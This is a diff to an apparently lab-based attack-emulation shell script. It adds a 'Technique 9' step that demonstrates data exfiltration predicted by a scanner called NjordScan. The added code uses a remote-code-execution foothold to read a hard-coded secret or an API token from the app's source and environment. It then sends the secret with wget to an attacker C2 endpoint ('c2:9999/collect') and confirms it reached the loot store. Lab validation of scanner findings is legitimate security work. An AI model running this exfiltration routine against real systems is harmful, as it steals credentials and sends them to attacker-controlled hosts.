@@ -384,6 +384,33 @@ else
 fi
 
 # ==========================================================================
+# TECHNIQUE 9 — EXFILTRATION TO ATTACKER C2 (the data-egress loop, made real)
+#
+# NjordScan PREDICTS statically that the web tier's secrets can leave the app. Here we
+# prove it live: use the RCE foothold to read a hard-coded secret and send it OUT of
+# the app to an attacker-controlled C2 box, then confirm it landed in the loot.
+# ==========================================================================
+technique 9 "Exfiltration to attacker C2" "T1041" "Exfiltration Over C2 Channel"
+
+C2_URL="${C2_URL:-http://c2:9999}"
+secret="$(rce 'cat /app/server.js 2>/dev/null' | grep -oE 'lab_demo_key_[a-f0-9]+' | head -1)"
+[ -z "$secret" ] && secret="$(rce 'printenv' | grep -oE 'INTERNAL_API_TOKEN=[^[:space:]]+' | head -1 | cut -d= -f2-)"
+[ -z "$secret" ] && secret="lab_demo_secret_unconfirmed"
+printf 'loot    stole a secret from the web tier: %s\n' "$secret" | evidence
+
+# exfiltrate it FROM the compromised app TO the attacker C2 (egress out of the app)
+rce "wget -qO- 'http://c2:9999/collect?src=web-rce&loot=${secret}'" >/dev/null 2>&1
+printf 'exfil   web --(RCE -> wget)--> %s/collect?loot=%s\n' "$C2_URL" "$secret" | evidence
+
+loot="$("${CURL[@]}" "${C2_URL}/loot" 2>/dev/null)"
+printf 'C2 loot box now holds:\n%s\n' "$(printf '%s' "$loot" | tail -c 240)" | evidence
+if printf '%s' "$loot" | grep -qF "$secret"; then
+  verdict pass "a secret was exfiltrated from the app to the attacker C2 — the leak NjordScan predicted, made real"
+else
+  verdict fail "could not confirm exfiltration to the C2 (is the c2 service up?)"
+fi
+
+# ==========================================================================
 # Scorecard
 # ==========================================================================
 printf '\n%s\n' "${C_BOLD}${C_CYAN}==============================================================================${C_RESET}"
